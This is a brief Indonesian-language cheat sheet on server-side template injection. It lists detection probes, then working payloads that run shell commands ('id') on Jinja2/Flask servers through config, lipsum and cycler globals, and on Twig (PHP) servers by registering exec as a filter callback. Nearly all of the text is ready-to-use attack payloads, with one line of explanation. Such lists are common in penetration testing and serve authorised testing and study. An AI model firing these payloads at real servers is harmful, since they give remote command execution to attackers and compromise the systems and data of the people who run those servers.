# SSTI (Server-Side Template Injection)

## Deteksi
```text
{{7*7}}    ${7*7}    #{7*7}    <%= 7*7 %>
```
Jika muncul `49`, vulnerable.

## Jinja2 (Python/Flask) RCE
```text
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

## Twig (PHP)
```text
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
```
